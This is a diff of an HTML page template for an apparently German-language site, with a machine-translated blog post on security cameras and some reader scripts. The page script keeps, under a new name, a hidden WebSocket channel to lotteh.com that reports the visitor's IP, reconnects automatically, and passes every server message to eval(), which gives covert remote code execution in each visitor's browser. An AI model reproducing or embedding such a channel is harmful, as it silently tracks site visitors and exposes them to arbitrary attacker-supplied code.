@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Was sind die Vorteile für eine Überwachungskamera? </p> <p> <br> </p> <p> 1.Abschreckung krimineller Aktivitäten - Überwachungskameras können potenziellen Kriminellen als Abschreckung dienen, da sie weniger wahrscheinlich ein Verbrechen begehen, wenn sie wissen, dass sie beobachtet werden. </P> <p> <br> </p> <p>2.Überwachung und Überwachung - Überwachungskameras ermöglichen es Ihnen, Ihr Eigentum zu überwachen und verdächtige Aktivitäten in Echtzeit im Auge zu behalten, um Diebstahl, Vandalismus oder andere Verbrechen zu verhindern. </P> <p> <br> </p><p> 3.Beweise für ein Verbrechen - In dem unglücklichen Ereignis, dass ein Verbrechen auf Ihrem Eigentum stattfindet, kann Sicherheitskameramaterial entscheidende Beweise für Strafverfolgungs- und Versicherungsansprüche liefern. </P> <p> <br> </p> <P.> 4.Remote -Zugriff - Viele Sicherheitskameras bieten jetzt Remote -Anzeigefunktionen an, sodass Sie von überall mit Ihrem Smartphone oder Computer auf Ihrer Eigenschaft einchecken können. </P> <p> <br> </p> <p> 5.Friedensfriedenüberwacht und potenzielle Bedrohungen werden erkannt und</div>
+<div style="white-space: pre-wrap;"><p>Was sind die Vorteile für eine Überwachungskamera?</p><p><br/></p><p>1. Abschreckung krimineller Aktivitäten - Überwachungskameras können potenziellen Kriminellen als Abschreckung dienen, da sie weniger wahrscheinlich ein Verbrechen begehen, wenn sie wissen, dass sie beobachtet werden.</p><p><br/></p><p>2. Überwachung und Überwachung - Überwachungskameras ermöglichen es Ihnen, Ihr Eigentum zu überwachen und verdächtige Aktivitäten in Echtzeit im Auge zu behalten, um Diebstahl, Vandalismus oder andere Verbrechen zu verhindern.</p><p><br/></p><p>3. Beweise bei einem Verbrechen - In dem unglücklichen Ereignis, dass ein Verbrechen auf Ihrem Eigentum stattfindet, kann Sicherheitskamera -Filmmaterial entscheidende Beweise für Strafverfolgungs- und Versicherungsansprüche liefern.</p><p><br/></p><p>4. Remotezugriff - Viele Sicherheitskameras bieten jetzt Remote -Anzeigefunktionen, sodass Sie mit Ihrem Smartphone oder Computer in Ihrer Immobilie von überall von überall einchecken können.</p><p><br/></p><p>5. Seelenfrieden - Die Installation von Überwachungskameras kann beruhigt sein, wenn Sie wissen, dass Ihr Eigentum überwacht wird und potenzielle Bedrohungen erkannt und aufgezeichnet werden.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
